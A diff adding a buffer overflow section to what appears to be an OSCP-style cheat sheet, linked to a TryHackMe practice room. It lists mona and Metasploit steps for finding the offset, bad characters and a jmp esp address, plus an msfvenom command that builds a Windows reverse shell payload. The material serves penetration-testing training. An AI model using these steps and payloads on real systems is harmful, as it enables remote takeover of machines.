@@ -683,3 +683,17 @@ Buffer Overflow
 ===============================================================================================
 
 <br>
+
+-    [Tib3rius](https://tryhackme.com/room/bufferoverflowprep)
+
+         !mona config -set workingfolder c:\mona\%p
+         /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_value + 400>
+         !mona findmsp -distance <crash_value> + retn = BBBB
+         !mona bytearray -b "\x00"
+         python bad_chars.py
+         !mona compare -f C:\mona\oscp\bytearray.bin -a <esp addr>
+         !mona jmp -r esp -cpb "\x00"
+         msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=4444 EXITFUNC=thread -b "\x00" -f py
+         padding = "\x90" * 16
+         
+<br?
